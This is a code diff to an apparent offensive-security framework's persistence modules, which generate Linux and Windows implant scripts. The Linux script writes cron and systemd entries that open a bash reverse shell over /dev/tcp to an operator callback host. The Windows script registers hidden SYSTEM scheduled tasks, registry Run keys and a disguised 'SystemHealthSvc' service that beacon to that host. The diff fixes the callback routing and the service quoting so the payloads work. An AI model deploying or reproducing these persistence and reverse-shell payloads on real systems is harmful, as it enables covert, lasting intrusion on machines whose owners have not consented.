@@ -2,9 +2,44 @@
 
 from __future__ import annotations
 
+import os
 from typing import Any
 
 from tools.attack_modules.base import AttackModule, ModuleContext
+
+
+def _callback_host_port(ctx: ModuleContext) -> tuple[str, str]:
+    """Resolve the operator's callback/C2 listener host:port for a persistence
+    script.
+
+    Phase 2: the scripts previously hardcoded ``ctx.target_ip`` as the callback
+    host -- the VICTIM does not run a listener, and the target-IP lock
+    (``terminal._target_lock_block``) blocks any callback to a host not in
+    ``exploit.allowed_targets``, so every persistence script was broken
+    against the allowlist. Resolution order:
+
+    1. ``ctx.parameters["callback_host"]`` / ``["callback_port"]`` (task-level,
+       set by the orchestrator when it knows the operator's listener);
+    2. ``EXPLOIT_CALLBACK_HOST`` / ``EXPLOIT_CALLBACK_PORT`` env vars;
+    3. the first entry of ``exploit.allowed_targets`` (the operator's own box)
+       with a default port 4444;
+    4. ``<CALLBACK_HOST>`` / ``<CALLBACK_PORT>`` placeholders the operator must
+       replace (the script still runs, but the callback is inert until then).
+
+    The resolved host MUST be in ``exploit.allowed_targets`` or the terminal
+    target-lock blocks the connection -- the note on each module says so.
+    """
+    params = ctx.parameters or {}
+    host = str(params.get("callback_host") or os.environ.get("EXPLOIT_CALLBACK_HOST", "") or "")
+    port = str(params.get("callback_port") or os.environ.get("EXPLOIT_CALLBACK_PORT", "") or "")
+    if not host:
+        cfg = ctx.config or {}
+        allowed = (cfg.get("exploit", {}) or {}).get("allowed_targets", []) or []
+        if allowed:
+            host = str(allowed[0])
+    if not port:
+        port = "4444"
+    return host or "<CALLBACK_HOST>", port or "<CALLBACK_PORT>"
 
 
 class LinuxPersistence(AttackModule):
@@ -16,18 +51,30 @@ class LinuxPersistence(AttackModule):
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
         script = self.generate_python_script(ctx)
+        cb_host, cb_port = _callback_host_port(ctx)
         return {
             "status": "script_generated",
             "module": self.name,
             "script": script,
-            "note": "Installs a cron-based persistence hook and attempts systemd unit + SSH authorized_keys fallbacks.",
+            "note": (
+                "Installs a cron-based persistence hook and attempts systemd unit + SSH "
+                "authorized_keys fallbacks. "
+                f"Callback host: {cb_host}:{cb_port} -- must be in exploit.allowed_targets "
+                "or the terminal target-lock blocks the reverse connection."
+            ),
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
+        cb_host, cb_port = _callback_host_port(ctx)
         return f'''import os, sys, json, subprocess, pwd
 # Target: {ctx.target_ip}
 # Linux persistence: cron (canonical) + systemd unit + SSH authorized_keys fallbacks.
+# Phase 2: callback goes to the OPERATOR's listener ({cb_host}:{cb_port}), not
+# the victim -- the victim does not run a listener and the target-IP lock
+# blocks callbacks to non-allowlisted hosts.
 TARGET = "{ctx.target_ip}"
+CALLBACK_HOST = "{cb_host}"
+CALLBACK_PORT = "{cb_port}"
 results = {{"cron": False, "systemd": False, "authorized_keys": False, "errors": []}}
 
 # --- 1. Cron-based persistence (canonical marker) ---
@@ -36,7 +83,7 @@ try:
     os.makedirs(cron_dir, exist_ok=True)
     cron_user = pwd.getpwuid(os.getuid()).pw_name if hasattr(os, "getuid") else "root"
     cron_file = os.path.join(cron_dir, cron_user) if cron_dir == "/var/spool/cron" else os.path.join(cron_dir, "root")
-    payload_line = "*/5 * * * * /bin/sh -c 'bash -i >& /dev/tcp/" + TARGET + "/4444 0>&1' # persist"
+    payload_line = "*/5 * * * * /bin/sh -c 'bash -i >& /dev/tcp/" + CALLBACK_HOST + "/" + CALLBACK_PORT + " 0>&1' # persist"
     try:
         with open(cron_file, "a") as fh:
             fh.write(payload_line + "\\n")
@@ -60,7 +107,7 @@ try:
         "Description=Persistence\\n"
         "[Service]\\n"
         "Type=simple\\n"
-        "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/" + TARGET + "/4444 0>&1'\\n"
+        "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/" + CALLBACK_HOST + "/" + CALLBACK_PORT + " 0>&1'\\n"
         "Restart=always\\n"
         "[Install]\\n"
         "WantedBy=default.target\\n"
@@ -123,18 +170,29 @@ class WindowsPersistence(AttackModule):
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
         script = self.generate_python_script(ctx)
+        cb_host, cb_port = _callback_host_port(ctx)
         return {
             "status": "script_generated",
             "module": self.name,
             "script": script,
-            "note": "Installs a scheduled-task persistence hook and attempts registry Run key + service fallbacks.",
+            "note": (
+                "Installs a scheduled-task persistence hook and attempts registry Run key + "
+                "service fallbacks. "
+                f"Callback host: {cb_host}:{cb_port} -- must be in exploit.allowed_targets "
+                "or the terminal target-lock blocks the beacon connection."
+            ),
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
+        cb_host, cb_port = _callback_host_port(ctx)
         return f'''import os, sys, json, subprocess
 # Target: {ctx.target_ip}
 # Windows persistence: scheduled task (canonical) + registry Run key + service fallbacks.
+# Phase 2: beacon goes to the OPERATOR's listener ({cb_host}:{cb_port}), not the
+# victim; the target-IP lock blocks callbacks to non-allowlisted hosts.
 TARGET = "{ctx.target_ip}"
+CALLBACK_HOST = "{cb_host}"
+CALLBACK_PORT = "{cb_port}"
 results = {{"schtask": False, "registry_run": False, "service": False, "errors": []}}
 
 def _ps(cmd):
@@ -147,7 +205,7 @@ def _ps(cmd):
 try:
     create = (
         "$a=New-ScheduledTaskAction -Execute 'powershell.exe' "
-        "-Argument '-WindowStyle Hidden -Command \\"Invoke-WebRequest -Uri http://" + TARGET + "/beacon\\"';"
+        "-Argument '-WindowStyle Hidden -Command \\"Invoke-WebRequest -Uri http://" + CALLBACK_HOST + ":" + CALLBACK_PORT + "/beacon\\"';"
         "$t=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5);"
         "$p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest;"
         "Register-ScheduledTask -TaskName 'SystemHealthUpdate' -Action $a -Trigger $t -Principal $p -Force"
@@ -162,7 +220,7 @@ try:
     run_cmd = (
         "New-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' "
         "-Name 'SystemHealth' -Value 'powershell.exe -WindowStyle Hidden -Command \\""
-        "Invoke-WebRequest -Uri http://" + TARGET + "/beacon\\"' -PropertyType String -Force"
+        "Invoke-WebRequest -Uri http://" + CALLBACK_HOST + ":" + CALLBACK_PORT + "/beacon\\"' -PropertyType String -Force"
     )
     proc = _ps(run_cmd)
     results["registry_run"] = proc.returncode == 0
@@ -171,9 +229,14 @@ except Exception as e:
 
 # --- 3. Service persistence (best-effort) ---
 try:
+    # Phase 2: sc.exe requires the binPath value to be quoted when it contains
+    # spaces -- the old unquoted form truncated at the first space and the
+    # service was created with a broken command. The outer quotes belong to
+    # sc.exe's key= value syntax; the inner escaped quotes protect the cmd /c
+    # command line.
     svc_cmd = (
-        "sc.exe create SystemHealthSvc binPath= 'cmd /c powershell -WindowStyle Hidden -Command \\""
-        "Invoke-WebRequest -Uri http://" + TARGET + "/beacon\\"' start= auto"
+        "sc.exe create SystemHealthSvc binPath= \\"cmd /c powershell -WindowStyle Hidden -Command \\""
+        "Invoke-WebRequest -Uri http://" + CALLBACK_HOST + ":" + CALLBACK_PORT + "/beacon\\"\\" start= auto"
     )
     proc = subprocess.run(svc_cmd, shell=True, capture_output=True, text=True, timeout=30)
     results["service"] = proc.returncode == 0
